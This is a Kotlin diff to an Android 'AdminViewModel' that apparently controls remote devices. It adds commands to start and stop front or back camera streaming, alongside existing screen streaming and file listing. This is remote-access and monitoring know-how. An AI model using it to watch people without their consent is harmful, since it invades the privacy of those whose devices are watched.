@@ -98,6 +98,9 @@ class AdminViewModel(application: Application) : AndroidViewModel(application) {
     private val _liveStreamState = MutableStateFlow<LiveStreamState?>(null)
     val liveStreamState: StateFlow<LiveStreamState?> = _liveStreamState.asStateFlow()
 
+    private val _cameraStreamState = MutableStateFlow<CameraStreamState?>(null)
+    val cameraStreamState: StateFlow<CameraStreamState?> = _cameraStreamState.asStateFlow()
+
     private val _activeCommandProgress = MutableStateFlow<ActiveCommandProgress?>(null)
     val activeCommandProgress: StateFlow<ActiveCommandProgress?> = _activeCommandProgress.asStateFlow()
 
@@ -419,6 +422,9 @@ class AdminViewModel(application: Application) : AndroidViewModel(application) {
             "list_directory" -> "استعراض الملفات"
             "start_stream" -> "بدء بث الشاشة"
             "stop_stream" -> "إيقاف بث الشاشة"
+            "start_camera_stream_front" -> "بدء بث الكاميرا الأمامية"
+            "start_camera_stream_back" -> "بدء بث الكاميرا الخلفية"
+            "stop_camera_stream" -> "إيقاف بث الكاميرا"
             else -> "تنفيذ الأمر ($commandType)"
         }
     }
@@ -830,7 +836,7 @@ class AdminViewModel(application: Application) : AndroidViewModel(application) {
                     val state = connector.getLiveStreamState(token)
                     _liveStreamState.value = state
                 } catch (e: Exception) {
-                    Log.e("AdminViewModel", "Error in stream polling", e)
+                    Log.e("AdminViewModel", "Error in screen stream polling", e)
                 }
                 delay(1200) // Poll every 1.2s
             }
@@ -842,6 +848,33 @@ class AdminViewModel(application: Application) : AndroidViewModel(application) {
         runCommand("stop_stream")
         streamPollingJob?.cancel()
         _liveStreamState.value = _liveStreamState.value?.copy(isActive = false)
+    }
+
+    fun startCameraStream(isFront: Boolean) {
+        val token = _selectedDeviceToken.value ?: return
+        val command = if (isFront) "start_camera_stream_front" else "start_camera_stream_back"
+        runCommand(command)
+        
+        // Start high-frequency camera-stream-polling
+        streamPollingJob?.cancel()
+        streamPollingJob = viewModelScope.launch {
+            while (true) {
+                try {
+                    val state = connector.getCameraStreamState(token)
+                    _cameraStreamState.value = state
+                } catch (e: Exception) {
+                    Log.e("AdminViewModel", "Error in camera stream polling", e)
+                }
+                delay(1200) // Poll every 1.2s
+            }
+        }
+    }
+
+    fun stopCameraStream() {
+        val token = _selectedDeviceToken.value ?: return
+        runCommand("stop_camera_stream")
+        streamPollingJob?.cancel()
+        _cameraStreamState.value = _cameraStreamState.value?.copy(isActive = false)
     }
 
     fun deleteMediaItem(category: String, itemId: String) {
